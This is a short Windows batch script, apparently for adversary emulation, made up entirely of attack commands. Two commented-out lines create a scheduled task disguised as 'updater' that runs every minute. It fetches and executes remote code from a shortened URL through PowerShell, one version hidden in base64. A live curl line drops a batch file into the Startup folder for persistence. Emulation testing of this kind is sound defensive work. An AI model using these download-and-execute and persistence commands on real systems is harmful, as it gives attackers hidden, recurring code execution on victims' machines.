:: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -e aQBlAHgAIAAoAGkAdwByACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAHkAZgBkAGQAZAAyAHoAcAAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA="

:: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri 'https://tinyurl.com/yfddd2zp' -UseBasicParsing).Content"


curl.exe -k -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat" "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat"

